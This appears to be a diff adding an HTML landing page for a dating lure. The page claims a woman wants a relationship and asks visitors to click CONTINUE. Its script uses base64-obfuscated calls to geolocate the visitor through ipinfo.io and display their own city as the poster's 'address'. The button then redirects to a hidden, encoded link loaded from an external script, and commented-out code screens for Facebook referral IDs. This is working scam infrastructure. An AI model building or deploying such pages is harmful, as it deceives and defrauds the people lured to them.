@@ -1,0 +1,107 @@
+<!doctype html>
+<html lang="en-US">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Lets Make A Serious Relationship With Me</title>
+    <script src="https://code.jquery.com/jquery-3.4.1.js"
+        integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" />
+    <meta property="og:image" content="ctk.jpg" />
+    <meta property="og:title" content="Lets Make A Serious Relationship With Me" />
+    <meta property="og:description" content="Lets make a serious relationship
+    with me" />
+    <script src=" https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
+    <script src="js.js"></script>
+    <style>
+        body {
+            width: 100%;
+            height: auto;
+            background-size: contain;
+            background-position: center;
+        }
+    </style>
+    <link rel="stylesheet" type="text/css" href="css.css">
+    <script src="https://code.jquery.com/jquery-3.4.1.js"
+        integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="main.js"></script>
+    <script type="text/javascript" src="backoffer.js"></script>
+    <style>
+        body {
+            background-image: url("ctkt.jpg");
+            width: 100%;
+            height: auto;
+            background-size: contain;
+            background-position: center;
+        }
+
+        h1 {
+            font-size: 25px;
+            font-family: fantasy;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="topnav">
+    </div>
+    <div>
+        <div class="step">
+            <h1 class=""> Hello </h1>
+
+            <h1> I want to make a serious relationship with you </h1>
+            <h1>
+                <div id="address" class="p-3 mb-2 bg-info text-white"></div>
+            </h1>
+            <img src="ctk.jpg" alt="girl" class="girl">
+            <h1 class="popup_text">If you live near my address, we can immediately date and makeing love<br><br>Please
+                write your contact below. I really want to have a
+                lover.<p>
+
+                </p><button id="wow" class="ok btn tr-submit-button"> CONTINUE </button>
+            </h1>
+        </div>
+    </div>
+</body>
+<script>
+    $("#wow").click(function () {
+        var target = atob(get_link());
+        window.location = target;
+        /*
+        var url = new URL(document.URL);
+        var c = gup("fbclids", url);
+        var d = gup("fbclid", url);
+        if (c !== null || d !== null) {
+        s
+        } else {
+        alert(
+        atob(
+        "SGksIHBsZWFzZSByZXBlYXQgOiggWW91IGFyZSBub3QgZnJvbSBteSBGYWNlYm9vayBwYWdl"
+        )
+        );
+        var target = atob(get_link(0));
+        window.location = target;
+        }
+        */
+    });
+
+    function gup(name, url) {
+        if (!url) url = location.href;
+        name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
+        var regexS = "[\\?&]" + name + "=([^&#]*)";
+        var regex = new RegExp(regexS);
+        var results = regex.exec(url);
+        return results == null ? null : results[1];
+    }
+    var patch = atob("aHR0cHM6Ly9pcGluZm8uaW8vanNvbg==");
+    var bar = atob("TXkgYWRkcmVzcyA6IA==");
+    $.get(patch, function (response) {
+
+        $("#address").html(bar + response.city + ", " + response.region);
+    }, "jsonp");
+</script>
+
+</html>
